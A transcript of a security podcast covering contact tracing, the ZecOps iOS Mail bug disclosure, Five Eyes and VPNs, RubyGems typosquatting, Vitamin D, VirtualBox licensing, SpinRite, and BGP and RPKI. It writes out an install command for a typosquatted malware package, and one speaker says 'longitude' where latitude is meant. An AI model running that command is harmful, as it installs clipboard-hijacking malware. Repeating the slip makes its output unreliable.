Could individual apps built on this API work hard to subvert the system by adding the user's identity to the uploaded reports?  Yes.  Of course.  And this is why I so strongly wish that Apple and Google were going further and were themselves providing the turnkey apps that run atop those APIs.  Would I be surprised if the Chinese government's apps running on top of this API did not also embed their citizens' identity into the uploaded content?  Of course not.  None of us would.  But that's not the API's fault, and it's not even theoretically possible to prevent that from being done by any untrustworthy app.



So yeah, the stakes are high, and everyone is freaked out right now.  And at the very least, what we've got is a very good start.  Virus researchers and epidemiologists are telling us that this will probably not be the last such pandemic we encounter in our lifetimes.  Hopefully we'll all be around.  Well, yeah.  Hopefully it's a ways off, and we'll also still be around for it.  But having this extremely well-designed contact tracing platform in place today, for whatever good it may do now, is probably equipping us to better handle the next one.



We have heard that both Apple and Google intend to submerge this into the OS, which says, great, it'll be there next time.  We know that Apple has a strong interest in leveraging their iDevices to improve personal health.  It would make a lot of sense for a future iOS, iPad OS, and Watch OS to natively incorporate Apple's own trusted and trustworthy contact tracing app.  It would sit there unused, but ready for next time.  So maybe.



So, you know, they're moving forward.  It'll be fun for them to release something.  And I'm glad that they did it quickly so that app developers can jump on it, and let's cross our fingers that they follow the clear intent that the API has of honoring people's privacy.  Maybe there'll be some open source apps that will get adopted, in which case they could be audited, and we'll be able to see what's inside and what they're doing.  That would be good.



Last week two ways of crashing the native mail app in iOS were disclosed.  What more of it was there?  Unfortunately, thanks to the inflammatory nature of the disclosure by, you know, I guess it's not a firm we've ever spoken of on this podcast.  They've never been on our radar before.  It's the company called ZecOps in San Francisco.  Their disclosure made a lot of claims.  And the tech press had a probably somewhat unjustified field day over this one.



One of the reports started out with the headline:  "Zero-Day Warning:  It's Possible to Hack iPhones Just by Sending Emails."  Then they said:  "Watch out, Apple users!  The default mailing app preinstalled on millions of iPhones and iPads [in other words, all of them] has been found vulnerable to two critical flaws that attackers are exploiting in the wild [we're not sure about that] at least from the last two years [and maybe longer] to spy on high-profile victims.  The flaws could eventually let remote hackers secretly take complete control over Apple devices [there's no evidence of that] just by sending an email to any targeted individual with his email account logged into the vulnerable app."  Okay.  Meaning you get email.



"According to cybersecurity researchers at ZecOps [that's Z-E-C-O-P-S] the bugs in question are remote code execution flaws [no, but that's okay] that reside in the MIME library of Apple's mail app, first due to an out-of-bounds write bug, and second a heap overflow issue."  So that was the way one report began.  The trouble here is that, while there are, as we know, many legitimate security concerns, this almost certainly, at least at this level of hype, was not one of them.  And this sort of headline-grabbing, crying wolf, damages the security industry's credibility somewhat when it turns out not to have been an issue.  I mean, Spectre on Intel has been a little bit like that.



And we also had "iPhone Zero-Day:  Don't panic!  Here's what you need to know."  And "A critical iPhone and iPad bug that lurked for eight years may be under active attack.  Malicious emails require little or no interaction.  Exploits active since at least 2018."  And I have more, but I'll skip them because they're all similarly breathless.



So the full disclosure by this company, ZecOps - which, by the way, in very poor form, has preceded Apple's release of a patch for iOS.  Still not available today.  It's expected soon.  It is in the beta.  But it's going to be in 13.4.5, which I checked just a short time ago.  I'm at .1, so we're vulnerable.  And there's been a complete disclosure of this, as I said, in very poor form.  They claimed, without details or proof, that they had found evidence of the bugs being used in the wild against a list of high-profile targets that included - and here they get obscure.  Maybe I guess these are clients of theirs based on what I heard you talking about, Leo, on MacBreak.  That sounds like it's the case.



They wrote:  "Individuals of a Fortune 500 organization in North America; an executive from a carrier in Japan; a VIP from Germany; MSSPs, that's Managed Security Service Providers, from Saudi Arabia and Israel; a journalist in Europe; and, they suspected, an executive from a Swiss enterprise."  So that's the way their disclosure went.  And in fairness, we know that it's true that forensic backtracking and analysis often leave holes that need to be filled.  And it's conceivable that these flaws, which are real, were being used in targeted attacks.  But the researchers never managed to actually do that.  They managed to use very large emails with MIME attachment embeddings to crash iOS with a heap overflow and an out-of-bounds write.



Both are bad, and either could theoretically lead to a more powerful attack by a sufficiently skilled attacker.  And this may be the way this was used, by some nation state-grade attacker.  This may have been the way in.  And then after that, other exploits were used.  But there's no evidence of that.  It was never shown.  And their own disclosure FAQ, they asked and answered the question they asked themselves:  "Why are you disclosing these bugs before a patch is available?"



And their answer was, they said:  "It's important to understand the following."  Three points:  "These bugs alone cannot cause harm to iOS users since the attackers would require an additional infoleak bug" - that's for ASLR avoidance - "and a kernel bug afterwards for full control over the targeted device.  Two:  Both bugs were already disclosed during the publicly available beta update."  And it's like, what?  Wait a minute.  We know how closed-mouth Apple is.  That's not the case.  They may have said "fix some bugs in Mail," but they're saying that all the time.  



They continue:  "The attackers are already aware that the golden opportunity with MobileMail/mail daemon is almost over, and they will likely use the time until a patch is available to attack as many devices as possible."  Well, you've heard me espouse that theory often.  So maybe.  But there's no evidence of that happening.



"Three:  With very limited data we were able to see that at least six organizations were impacted by this vulnerability" - okay, and we should back off and say their phones crashed, but we'll get there in a second - "and the potential abuse of this vulnerability is enormous."  Potential, yeah, okay.  "We were confident that a patch must be provided for such issues with public triggers ASAP."



So then they said:  "It is our obligation to the public, our customers, partners, and iOS users globally to disclose these issues so people who are interested can protect themselves by applying the beta patch, or stop using Mail and temporarily switch to alternatives that are not vulnerable to these bugs.  We hope that, with making this information public, it will help to promote a faster patch."  In other words, they're saying they have some reason to believe Apple's not moving on this as quickly as possible, yet there's no reason to believe that that's the case.  Apple immediately put this thing in beta; and I'm sure, as soon as they know it's safe, we'll all be having to update our iDevices.  So I think that these guys were a little more desperate than they should have been to get headlines.  Headlines they got.  So they'll have to live with the consequences.



Last Friday Apple said that based on the details shared by ZecOps in its report, it could not reach the conclusion that the bug was exploited in the wild.  Apple wrote:  "Apple takes all reports of security threats seriously.  We have thoroughly investigated the researcher's report and, based on the information provided, have concluded these issues do not pose an immediate risk to our users.  The researcher identified three issues in Mail; but alone they are insufficient to bypass iPhone and iPad security protections, and we have found no evidence they were used against customers.  These potential issues will be addressed in a software update soon.  We value our collaboration with security researchers to help keep our users safe and will be crediting the researcher for their assistance."



So the ZecOps research sparked many other dissenting opinions similar to mine, from several interested iOS security researchers who also questioned ZecOps' somewhat self-serving conclusion that the bugs had been successfully exploited in the real world.  There were many dubious statements and claims in their disclosure.  My favorite, for example, is they said:  "Few of the suspicious events even included strings commonly used by hackers, for example, 414141414141414141."  They said that they were saying that hackers used hex 41.  Okay, except that hex 41 is uppercase "A," which is what you get when you Base64-encode a region of nulls or zeroes.



LEO:  Oh, how interesting.  I didn't know that.



STEVE:  Yeah.  And the MIME encoding used by email uses Base64 encoding for binary data.  So long runs of 41s is not frequently used by hackers.  It frequently appears in MIME encodings.



LEO:  Right, because it's a lot of zeroes.



STEVE:  Yes.



LEO:  Yeah.  Interesting.  Because I've seen those 414141s before, yeah.



STEVE:  Yeah.  That's capital "A," and those are zeroes encoded into ASCII so that you can send binary over an ASCII transport like email.  So it was like that.  And so...



LEO:  I learned something today.  That's really neat.  That's good.



STEVE:  So the ZecOps research based its assumption on the evidence of in-the-wild exploitation on crash logs that were found on devices they were inspecting where the crash logs were interpreted as failed attempts to trigger the bug.  ZecOps said that the failed exploitation event left an empty email and a crash log on the device.  But then, during a subsequent successful exploitation, ZecOps said the attacker would delete the empty emails in order to hide the attacks from the user.  Okay.  But then why leave the crash logs behind as evidence of the previous failed attempts, if you have the ability to delete things from the phone?



And it's pretty much all like that.  They really did seem to be reaching for headlines.  And they were never able to produce a working proof of concept.  All they showed was that some bugs which have existed for many years in Apple's MIME encoding interpreter could cause iOS to crash.  And they found instances of iOS having crashed in the past.  So yeah, it's good that the forthcoming release of iOS v13.4.5 will have this fixed.  For that, we can definitely thank them.



LEO:  I think that's probably Beta 5 of 13.4.2.



STEVE:  Oh, okay.  That makes more sense.  That makes more sense.



LEO:  We're currently at 1, point 1.



STEVE:  We're at 1, yes.  And I was wondering why...



LEO:  Yes, yes, be a big jump.  Yeah, I think it's Beta 5 of 13 point whatever point 2.



STEVE:  So whatever is past...



LEO:  13.4.2.



STEVE:  Yeah, whatever's past 13.4.1.



LEO:  The next one.



STEVE:  That's the one you want.  And until then, I don't think I would worry very much, unless you're a Saudi sheikh or something maybe.  But no, probably not.



LEO:  This has been a week that we've been quoting your famous - we're going to have to call it "Gibson's Law" or something - "Interpreters are hard."



STEVE:  Yes, yes.  Boy, does that keep paying off.



LEO:  Mm-hmm.



STEVE:  Okay.  So TechRadar had this, and I thought sort of they raised an interesting point, something perhaps for VPN users to consider.  We've often covered aspects, various aspects of intelligence sharing which involves the so-called "Five Eyes" alliance.  It was originally, it turns out, just Two Eyes, established between the U.S. and the U.K. back in the '40s, back in the 1940s.  It was an agreement to share intelligence gathered by each other's national intelligence services.  And we know that they're like, it's impossible for the U.S. to spy on its own citizens, but the U.K. doesn't have that obligation.



LEO:  How handy.



STEVE:  Yeah.  So we'll look at yours if you'll look at ours, and then maybe we'll compare notes.  That Two Eyes later expanded to include Australia, New Zealand, and Canada.  The intelligence sharing agreement was originally military in nature, designed to give participating nations an advantage in the Cold War.  But as we've often noted, today it also encompasses information relating to Internet activity and probably other interesting things.  And according to some of Edward Snowden's famous leaked documents, the group later grew to include Denmark, Norway, France, Italy, Belgium, Germany, Spain, Sweden, and the Netherlands, creating what is now the 14 Eyes pact.  Whoa.



LEO:  I didn't realize it had gotten so big.



STEVE:  Yeah.  And it's now also known as SIGINT Seniors Europe.  So they decided that 14 Eyes sounds a little dumb.  Let's give it a more fancy-sounding name.  So now, although somewhat less formal and official, the members of the 14 Eyes syndicate participate in similar intelligence collaboration activities, which falls outside the legal jurisdiction of any single nation state.  This may be significant for our listeners because it means that a VPN endpoint which is being used to deliberately relocate to another country may be conferring less privacy than its user intended.



In their discussion of this issue relating to VPNs, TechRadar noted that the potential privacy issues are amplified by the widespread use of free VPNs, which are more likely to keep activity logs than their paid counterparts, despite claims surrounding zero-log or logless policies.  They noted that we know that the information collected and logged could include websites visited, collection timestamps, bandwidth usage, server location, and even the client's original IP address, all of which is shareable among members of this intelligence pact.



In their coverage of this, TechRadar suggested that to avoid the potential privacy issues connected to the growing number of Eyes, users are advised to opt for a paid VPN with an audited no-logging policy, based if possible also in a country that does not fall under the growing number of Eyes alliance.  They noted that two popular services, one which immediately raised my antenna, ExpressVPN and NordVPN, are headquartered in the British Virgin Islands and Panama, respectively, and so avoid any association with the problematic and privacy compromising alliance.  And as our listeners know, ExpressVPN conveniently is a long-running sponsor of TWiT and has our recommendation.  So anyway, I just ran across that, and I thought, yeah, that would be something that our listeners would probably want to keep in mind.



LEO:  Is Switzerland one of the Five, or 15, or whatever Eyes?



STEVE:  I didn't see them.  I think the only S's we have are Spain and Sweden.



LEO:  Okay.  Because a lot of stuff is hosted in Switzerland, ProtonMail and stuff like that.



STEVE:  Yes, yes, yes.



LEO:  Germany, though, is in the 15 Eyes, I'm sure.



STEVE:  Oh, jawohl.



LEO:  Jawohl.  And there are a lot of secure servers.  Tutanota I think is my encrypted email server, and they're in Germany.  So, hmm, that's interesting.



STEVE:  Yeah.  And what's that messaging app that I liked a lot?



LEO:  Oh, yeah, Threema.



STEVE:  Threema.  They're Swiss, also.



LEO:  They're Swiss, yeah.



STEVE:  Yeah.



LEO:  Interesting.  So, yeah.  And, you know, my favorite sync system, Sync.com...



STEVE:  Sync.com.



LEO:  Yeah, where's that?



STEVE:  They're Canadian.  On the other hand, they are completely TNO.



LEO:  Well, let's see.  If it's end-to-end encrypted, who cares; right?  Because they can't give anything to the authorities anyway.



STEVE:  Right, exactly.  Unfortunately, a VPN is not.  It's client-to-server encrypted, and then your unencrypted stuff all comes out of a very concentrated, well-known, single point of exit.



LEO:  Right.



STEVE:  Which, you know, very much like the Tor nodes.  You just have to know that there's a lot of flies buzzing around those Tor nodes.  So, yeah.



LEO:  Yup, yup, yup, yup, yup.



STEVE:  Okay.  So no surprise to anyone that there are attacking hackers everywhere.  The so-called "typosquatting" attacks have been in the news lately.  I've not mentioned them before.  I decided, okay, it's worth just mentioning it so that it's on the record.  The programming language Ruby describes itself as a "dynamic open source programming language with a focus on simplicity and productivity."  It claims to have an elegant syntax that is natural to read and easy to write.  What we know is it has become quite popular over the years.



LEO:  I love it.



STEVE:  And has built up a strong following.



LEO:  It's a beautiful language, yeah.



STEVE:  And it's got a really cool history.  I won't go into it now.  But, I mean, it was deliberately designed to be pretty, I mean, to be elegant.  And it pulls from many different interesting automatic - it's in the automatic language class with garbage collection and so forth.  As with any popular programming language today, what will arise, and has, is a large and growing public repository of prepackaged add-on modules that can be freely downloaded and incorporated.  In this case...



LEO:  The RubyGems, they're awesome.  Love them.



STEVE:  Exactly.  RubyGems.  So a RubyGems package is obtained, downloaded, and installed from the public repository by simply entering the command "gem install {package name}."  The problem is typos in the package's name.  It turns out that if instead of entering, for example, "gem install atlas_client" to obtain the correct package, the unwitting Ruby coder entered "gem install atlas-client," the package that's downloaded and installed is the original intended atlas_client plus malware.



The security firm Reversing Labs found that the malicious Ruby gem, that one in particular, had added an apparent image file named aaa.png.  And when the package, the RubyGems package atlas_client was run under Windows, the file would be renamed to a.exe and run.  Such malware could, of course, do anything that it chose to, having been invited into your system inadvertently.  It could encrypt your drive.  So this is definitely something you don't want to get.



But in this case the a.exe malware monitors the system's Windows clipboard for text that looks like a cryptocurrency address which typically appears shortly before a cryptocurrency user performs an online transaction.  We've talked about these clipboard monitors before.  The attacker's own cryptocurrency address replaces the user's when the clipboard contents is pasted into the "Send the money here" field on a cryptocurrency transaction page, thus causing the bad guys to receive the money into their wallet rather than its intended recipient.  And of course the malware also adds an entry to the Windows registry for persistence so that it will be loaded every time Windows restarts.



Reversing Labs found more than 725 malicious typosquatted instances of this particular malware within the RubyGems repository.  So they, you know, atlas_client was just an example of one.  They went through, and they slightly modified.  They just looked at, okay, how could somebody mistype this?  And they grabbed it, downloaded the original, made the modification, and put it back up, hoping that somebody would mistake a hyphen for an underscore.  And the records demonstrated that many people got themselves infected this way.  And of course this is just one instance.  Who knows what else might be lurking there and elsewhere.



So unfortunately, sometimes you get more than you pay for.  These things are free, and I just wanted to remind our listeners to exercise caution.  It is, I mean, when I've done Perl stuff, I've grabbed things.  I've grabbed them from the official Perl repository.  I've been as careful as I can be.  But all of this free open source stuff is not wrapped in licenses and code signing and protection.  And it's not been scrutinized highly.  The problems, when found, are cleaned up quickly.  But in the meantime there's some exposure.  So anyway, I just sort of wanted to plant a little bit of a "proceed with caution" note.



LEO:  I hadn't thought about that.  But I do all kinds of package installs, and you do it in Linux, too.  You do use Apt or Pacman install.  I never thought about a typo and what that could be.  That's interesting, yeah.  



STEVE:  Yeah, typosquatting.



LEO:  Yeah.  I've seen it before with websites.



STEVE:  Yeah, of course, domain names like crazy.



LEO:  Domain names, yeah, interesting.



STEVE:  So this is just a random little bit of COVID-19 note.  I got a tweet from someone, and our listeners will remember that back at the beginning of all this novel coronavirus news I reminded everybody about the possible importance of Vitamin D.  I received a tweet from a listener pointing me to an interesting article on the Irish Health website.  It referred to a Longitudinal Study on Aging conducted by Trinity College in Dublin.  Which is the one landmark I told our listeners - and you'll remember, Leo, that I couldn't figure out - this is going to sound so dumb - how to open the train door.



LEO:  You were in Ireland last year to talk about SQRL.



STEVE:  Yeah.  And Lorrie really wanted to spend some time...



LEO:  And you're struggling with the door.



STEVE:  ...at Trinity College.  And there was, I don't know, you had to push something and then flip a handle or something.  And I was like, trying to do it.  Here, you know, Mr. Big Techie.  And meanwhile I'm watching the Trinity College go past.



LEO:  Bye-bye.  Oh, how frustrating.



STEVE:  So we didn't get to go.



LEO:  That's horrible.



STEVE:  But anyway, it turns out that it's Trinity College that did this longitudinal study.  I've got a link to the full PDF of their report and to their press release about the study.  The original IrishHealth.com piece sums it up quickly.  They said:  "Vitamin D may be an important factor in determining the severity of COVID-19 infections, new research from the Irish Longitudinal Study on Aging, which has the acronym TILDA, at Trinity College Dublin has found.



"According to Professor Rose Anne Kenny, principal investigator of TILDA, Vitamin D benefits bone health, muscle health, and the immune system."  Then, quoting her, "in addition to a potentially critical role in suppression of the severe pro-inflammatory response which characterizes severe COVID-19 complications."  And it says:  "As a result of their findings, the researchers are recommending that all nursing home residents in Ireland take Vitamin D."



So anyway, I just wanted to say again it turns out when I checked Twitter, when I was on Twitter to post the show notes link that Leo uses to download the show notes every week, somebody else had tweeted another study showing a correlation between longitude and COVID-19.  And as we know, longitude factors in because most people's only supply of Vitamin D is UVB radiation striking their skin.  So the further you are away from the Equator, the less strong the sun is, the less Vitamin D you have the opportunity to synthesize endogenously.  And glass blocks UVB completely.  So now we're all in our homes, not venturing out as much maybe as we normally do, which makes it a little more important.



So anyway, I wanted to say again, just a little reminder, that what's interesting is that it appears that it has an immune effect, immune strengthening to help you not get sick.  But on the other side, it appears to dampen that cytokine storm which is one of the things that makes people go critical if they have a severe attack of COVID-19.  So anyway, just another little blip.



And Blake Helms tweeted, and I appreciated this, Blake, thank you, although I already thanked him via DM.  He said:  "Hi, Steve.  During the latest episode you mentioned VirtualBox."  That of course was last week when I was raving about how impressed I was.  He said:  "One thing that should be noted is that included with the installer is the VirtualBox Extension Pack.  It provides things such as support for USB 2.0 and 3.0 and VM encryption.  It is closed source.  And while free for personal use, it is not free for commercial use.



"What's more, Oracle uses a highly inclusive definition of commercial use.  If a machine is used for any type of commercial work, even if VirtualBox is not part of that work, it's considered a commercial use and thus requires you to settle with Oracle.  Because it's a default option, many users don't realize that they are agreeing to the license fee.  Later, Oracle shows up, does an audit, and sends you a bill.  A local company just settled," he says, "with Oracle for $600K."



LEO:  Geez.



STEVE:  Yikes.



LEO:  Oh, Oracle.



STEVE:  "Because they had employees who installed it thinking it was free.  It's banned from the company I work for, along with most other Oracle software, for that reason."



So Blake, thank you.  I wanted to share that with our listeners.  The good news is I'm using it for DOS.  And DOS has never heard of USB anything.  And in my approach to minimize everything I install, I looked back, and I thought, no, there's nothing there for me.  But anyway, for our listeners, for what it's worth, I'm sure most of our listeners are probably just using their systems and VMs to screw around with and personal, non-commercial.  But again, Blake, thank you for the heads-up.



Work is proceeding nicely on SpinRite.  I want to make the testing phase as easy as possible for those who are interested in participating.  Since SpinTest, like SpinRite, boots and runs on DOS, I've prepared a new version of SpinRite's Windows app which will be able to prepare boot media, installing a bootable system into a diskette or a USB thumb drive, or create an ISO file for burning to an optical disc.  So that now exists.  I'm currently working to get the first release of SpinTest ready for packaging in its boot-prep installer.  So I hope that for next week's podcast I'll have some sense for how compatible this first AHCI driver code that I have written and which is working is across all of our testers' motherboards.



It turns out that there were some people having a problem with the himem.sys driver that FreeDOS uses on some systems.  And I had already, back in 2013, experimented with writing my own.  So I've decided that's the approach I'll take for the sake of compatibility.  And so I'm just now in the process.  I created a little ram.exe utility that everyone is playing with right now.  It's 1,224 bytes long, and it enumerates all of the RAM available from zero to the 1GB boundary in any machine that it's run on under DOS.  They're all having fun with that.  I'm getting a lot of good feedback.  I'll incorporate that into SpinTest.  So anyway, it's all going really well.  And it just feels, Leo, it feels so good to be working on SpinRite.



LEO:  I bet, yeah.



STEVE:  Lorrie and I normally take a walk every day.  And I said to her last week, I said, I just - it was hard to describe the lightness that I felt that I was finally doing what I'm actually supposed to be doing.



LEO:  Nice.



STEVE:  Rather than stealing time from it.  So anyway...



LEO:  That's great.



STEVE:  Making very good progress.



LEO:  Good.



STEVE:  Okay.  RPKI, Resource Public Key Infrastructure.  As we know, big iron public Internet routers move the Internet's packet traffic around the Internet.  Inside each of these routers is a massive routing table.  And oh, my god, the number of entries has gone exponential, from I think I saw a chart from 1991 to 2015.  I was annoyed that it didn't have a last five years in it because it was, I mean, it looked like the virus taking off.  We've all seen those exponential curves recently.  I mean, in a sense it is a virus of IP network subdivisions.  The idea is - I'll be using the term "network prefix."  And that's how you take, in the case of an IPv4 32-bit IP address, as we know, the most significant nbits of - oh, and there went a sale of SpinRite.  Someone's going to be able to upgrade for free soon and be able to play with what I have.



The most significant nbits of the IP address are considered to be the network that all of the machines consuming the least significant side of that IP address are on.  So a routing table doesn't have an entry for every IP address, thank goodness.  What it has is, it has a technology in classic Internet routing that we've spent podcasts on in the past, back in the early days of the podcast, which tries to match the most number of bits of an incoming packet's destination IP to find the entry in the table that refers to that network.  And with that entry in the table is the interface, the outbound interface onto which that packet should be put in order to send it on its way toward wherever that network is on the Internet.  And that's all there is.  It's really elegant and super cool.



The problem is managing those tables.  So that's where Border Gateway Protocol (BGP) comes in.  All of the routers maintain persistent BGP protocol TCP connections with each other, that is, with each of the routers that they are peering with, with the routers that are on the other side of the interface and the wire going somewhere.  They use BGP to share news of any updates to their routing tables so that changes to the Internet can propagate across the Internet, and routers can maintain proper tables.



However, as we know, since routing changes are shared, and they propagate across the Internet, if bogus routes are either accidentally or deliberately introduced, the Internet will break.  And the idea of breaking the Internet is something of a meme.  Oh, my god, I broke the Internet.  Turns out if you google that, you get hits.  But messing up BGP really is one way to break the Internet for real.  In their explanation of BGP, Cloudflare cites a couple of perfect examples of true past BGP routing errors.



Under "How BGP Can Break the Internet" they said:  "In 2004 a Turkish Internet service provider (ISP) called TTNet accidentally advertised bad BGP routes to its neighbors.  These routes claimed that TTNet itself was the best destination for all traffic on the Internet.  As these routes spread further and further to more autonomous systems, a massive disruption occurred, creating a one-day crisis where many people across the world were unable to access some or all of the Internet."



And I'll pause here for a bit of nomenclature.  And I do cover this in a second.  But this autonomous system, that's the designation with a number of somebody who owns a block of IP space.  So for example, all of our ISPs typically are - they're autonomous systems, and they have some AS number.  Way long ago, when I was talking to Mark Thompson, he was trying to talk me into applying for one, that is, getting an AS number, which would then have allocated me 256 IPs.  I would have been a little Class C net.  The point is I would have owned those IPs, and they would have been transportable from one bandwidth provider to another.



So, for example, when I left Verio and came to - first I was at XO for a while, and now I'm at Level 3.  I could have taken those with me.  And what would have happened was that, when I set myself up at a new location, I would have said, "I am autonomous system number something, and this is my block of IPs."  They would have put that into their router and advertised that this little network is now at this location.  So that's why there's kind of this weird jargon.  You advertise a network.  You advertise - actually what they're doing is called "advertising a prefix."  So they're saying this network prefix, 72.124.something, whatever it would be, dot and then dot star, this network prefix is now here.  And so as that propagates out through the Internet, routing tables get updated that change where any traffic matching that prefix will go.  It used to go to Verio.  Now it comes to Level 3.



Now, none of that happened.  I just didn't need 256 IPs.  I used to have 64, then I pared down, I have 16 now, and I'm happy.  That's plenty.  And as IPs have become increasingly scarce, those who do have big blocks are being challenged about how they're using them.  There are now IP justification forms that you need to fill out in order to explain how you're using all of those and why you need them.  So it's just as well because it would have been sad to part with my own Class C network.  But anyway. 



They also said:  "Similarly, in 2008, a Pakistani ISP attempted to use a BGP route to block" - now, this is deliberately - "attempted to use a BGP route to block Pakistani users from visiting YouTube.  The ISP then accidentally advertised these routes with its neighboring autonomous systems, and the route quickly spread across the Internet's BGP network.  This route sent users trying to access YouTube to a dead end, which resulted in YouTube being inaccessible for several hours."



So the idea there was Pakistan was trying to do internal BGP to essentially null route the network which was actually owned by YouTube, sending it to some dead IP.  When that escaped, they null-routed YouTube, not just for Pakistan, but for the Internet.  Whoops.  So that needed to get fixed.



And then they said:  "There are examples of a practice called" - I'm still quoting from Cloudflare.  "There are examples of a practice called 'BGP hijacking,' and it isn't always accidental.  In April of 2018, attackers deliberately created bad BGP routes to redirect traffic that was meant for Amazon's DNS Service.  The attackers were able to steal over $100,000 worth of cryptocurrency by redirecting this traffic to themselves."



And they finished:  "Incidents like these can happen because the route-sharing function of BGP relies on trust, and autonomous systems implicitly trust the routes that are shared with them.  While there have been a number of ambitious proposals intended to make BGP more secure, these are hard to implement because they would require every autonomous system to simultaneously update their behavior.  Since this would require the coordination of hundreds of thousands of organizations and potentially result in a temporary takedown of the entire Internet, it seems unlikely that any of these major proposals will be put in place anytime soon."  Well, the company known as BBN Technologies - Leo, you'll remember BBN.



LEO:  They invented the Internet.  Bolt, Beranek and Newman, yeah.



STEVE:  Exactly.  They were originally Bolt, Beranek and Newman, one of the earliest and key participants in the creation of the Internet.  All major players on the Internet who obtain their own permanent allocation of IP addresses, as I mentioned, like all of the early Internet originators had autonomous system numbers.  BBN's number was one.



LEO:  Nice number.



STEVE:  They were AS1.



LEO:  Oh, I like it.



STEVE:  Who do you think came up with Autonomous Systems?  Bet it was the guys that gave themselves the first one.  And a BBN employee by the name of Ray Tomlinson is credited with the invention of Internet email.  He's the guy who chose the "@" sign as the separator between an account and the mail domain name.  So my point is we old-timers all know Bolt, Beranek and Newman, which has now changed its name just to BBN Technologies.



Eight years ago, in February of 2012, RFC 6480 was published by two guys at BBN Technologies.  That RFC is titled "An Infrastructure to Support Secure Internet Routing."  The RFC's abstract reads:  "This document describes an architecture for an infrastructure to support improved security of Internet routing.  The foundation of this architecture is a Resource Public Key Infrastructure (RPKI) that represents the allocation hierarchy of IP address space and Autonomous System numbers; and a distributed repository system for storing and disseminating the data objects that comprise the RPKI, as well as other signed objects necessary for improved routing security.  As an initial application of this architecture, the document describes how a legitimate holder of IP address space can explicitly and verifiably authorize one or more ASes (Autonomous Systems) to originate routes to that address space.  Such verifiable authorizations could be used, for example, to more securely construct BGP route filters."



So the necessary flexibility of BGP allows any route to be originated and announced by any random network, independent of its rights to announce, that is to say, to advertise that route, meaning traffic matching a block of IPs should be sent to it, as opposed to anywhere else.  That's the situation we're in today.  So we need an out-of-band method to help BGP manage which network can announce which route.  The Resource Public Key Infrastructure is a cryptographic method of signing records that associate a BGP route announcement with the correct originating AS number.  As its name suggests, RPKI uses a certificate system similar to secure web browsing that we're all familiar with.  But the model breaks down rather quickly.  For a web connection to be secure, only two parties, the client and the server, need to play.  But to fully secure Internet routing, we sort of have to have an all-or-nothing situation.  We need broad, widespread, and thorough adoption of RPKI.



Now, it turns out that's not completely true anymore.  If the Internet had stayed hugely disaggregated, that would have been true.  But there are an increasing number of major players, like Cloudflare, like Amazon, like Microsoft, like Google, where these major players are carrying a huge - well, and Level 3, like the Tier 1 providers.  They are carrying a huge amount of the Internet's traffic.  So if only they make sure they don't accept bogus routes, that solves a bunch of the problem.



So we have Internet Routing Registries (IRRs) that are the entities that assign these Autonomous System numbers and the blocks of IP space.  There are five of these regional registries with familiar names.  There's FRINIC, APNIC, ARIN, LACNIC, and RIPE.  And their respective territories are shown on the map that I put in the show notes above.  You can see like the entire globe is covered, and it's one, two, three, four, five different colors.  These registries cover the world.



All five already provide a means for the registrants, that is, their registrants, to take IP and ASN (Autonomous System Numbers) pairs and get a Route Origin Authorization (ROA) record signed.  So just as a website obtains a certificate, signed by a certificate authority, attesting to the certificate holder's ownership of one or more domains, the ROA, this Route Origin Authorization, as its name sounds, is signed by one of the five registries operating as a TA, a Trust Anchor, and attesting to the fact that that Autonomous System's ownership of one or more blocks of IP space is valid.



In a world where no IPs would be routed to an Autonomous System without signed authorization for it to receive that incoming traffic, it's this ROA that will allow an autonomous system to authenticate the routes that it is advertising to the world over BGP.  So it doesn't go through BGP.  We're leaving BGP alone.  This is an out-of-band authentication architecture, an infrastructure that will be allowing a means for authenticating the ownership of IP ranges.  Strong support for RPKI as a consequence is what's needed for the future.



But IP-owning organizations are almost certainly going to need a push for its adoption.  Recall that we recently spoke about MANRS.  That was Mutually Agreed Norms for Routing Security.  No surprise.  And not surprisingly, this RPKI is one of the things the MANRS group is working toward.  And remember that Cloudflare recently joined or was invited to join, and a few others, like that class of Internet traffic carrier, to join the MANRS effort.



Cloudflare said:  "The Internet Society has pushed an initiative called MANRS (Mutually Agreed Norms for Routing Security) in order to convince the network operator community to implement routing security.  It focuses on filtering, anti-spoofing, coordination, and global validation.  The Internet Society is doing a good job in educating networks on the importance of better routing security.  While they do educate networks about various aspects of running a healthy BGP environment, it's not an effort that creates any of the required new technologies.  MANRS simply promotes best practices, which is a good start, and something Cloudflare can collaborate on.  All that said, we think it's simply too polite an effort, as it doesn't have enough teeth to quickly change how networks behave."



So to put a bit more political - and this is not them anymore, this is me.  To put a bit more political pressure on recalcitrant Internet Service Providers, Cloudflare has created a BGP security shaming website called "Is BGP Safe Yet?"  And yes, https://isbgpsafeyet.com.  Go there with your Internet connection and click the "Test Your ISP" button, and in a few seconds you'll find out whether your ISP is safely ignoring invalid prefixes.  The first time I went there, I got a no.



LEO:  Oh, no.



STEVE:  Oh, and I'm still getting a no.  That's interesting.  My location here says that Cox Communications at AS22773 - you can see we've come a long way from AS1.  AS22773 does not implement BGP safely.  It should be using RPKI to protect the Internet from BGP hijacks.  And then there's a link to tweet this news.



LEO:  Shame them, yeah.  Look at this.  I would expect SonicNet would, but apparently...



STEVE:  Well, again, this is new, Leo.  And it is not without some effort.  So I'm not holding anybody to, at this point - well, in fact, on that page is a list of known yeas and nays and  some uncertain results.  And there are a lot of people, I think Verizon is still not qualified.



LEO:  I'm not surprised.



STEVE:  For doing it.  So again, we're still in the Wild West of the Internet.  This is one of the problems.  The good news is irresponsible people are generally not running a router.  And if you misbehave with your router at the AS level, at the Autonomous System level, you can get blacklisted.  So you will suddenly have no traffic going to you, and none of your peers - your peers will just disconnect, and nothing you have to say will be useful.  So, I mean, it is a privilege to have your traffic accepted by your peers.  And with that comes great responsibility.



So believe me, the people who are putting routes into BGP-equipped routers are having triple double-checking of making sure that the asterisk is in the right place and the slash is where it should be.  And it's worth noting RPKI is not a bulletproof solution to securing all routing on the Internet.  However, it represents what I think is the first milestone in moving from purely trust-based to authentication-based routing.  Cloudflare explained that their intention is to demonstrate that it can be done simply and cost-efficiently, and they are inviting operators of critical Internet infrastructure, which is what any Autonomous System is a part of, to follow them in a large-scale deployment of RPKI.  And they're suggesting that with this effort, Is BGP Safe Yet, that we lowly end users might help a bit by checking to see how our ISP is doing and perhaps giving them a little public shame or an attaboy with a tweet in the right direction.



And one last note.  A guy named Job Snijders, I guess, J-O-B, and his last name is S-N-I-J-D-E-R-S, so I would guess Job Snijders...



LEO:  It sounds Dutch, which means it's not even close.



